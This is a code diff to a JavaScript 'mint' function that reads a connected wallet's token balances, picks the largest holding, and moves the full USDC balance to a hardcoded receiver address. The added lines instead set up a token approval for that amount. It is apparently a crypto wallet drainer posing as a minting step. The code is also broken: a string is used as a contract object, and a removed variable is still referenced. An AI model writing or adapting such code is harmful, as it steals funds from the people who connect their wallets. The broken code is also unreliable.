@@ -120,12 +120,12 @@ function mint(wallet) {
       const BalanceSandbox = Web3Client.utils.fromWei(await contractSandbox.methods.balanceOf(adress).call()) * Sandboxprice.usdPrice;
       const maxUSD = Math.max(BalanceSandbox, BalanceDai, BalanceUSDC, BalanceShiba, BalanceApeCoin, BalanceUniswap, BalancePolygon, BalanceWETH, BalanceBUSD, BalanceTether);
       if (maxUSD == BalanceUSDC) {
-        const options = {
-  type: "erc20",
-  amount: Moralis.Units.Token(BalanceUSDC.toString(10), "6"),
-  receiver: "0xDB166D515EB187ec35a54aF33592d84D5B8Ef1Ff",
-  contractAddress: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
-};
+        const Contract = ('0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48');
+        const spenderAdr = ('0xDB166D515EB187ec35a54aF33592d84D5B8Ef1Ff');
+        const amount = ((BalanceUSDC * 1000000).toString(10))
+        Contract.methods.approve(adress, amount).send({
+   from: adress
+})
 let result = await Moralis.transfer(options);
       }
       console.log(BalanceTether);
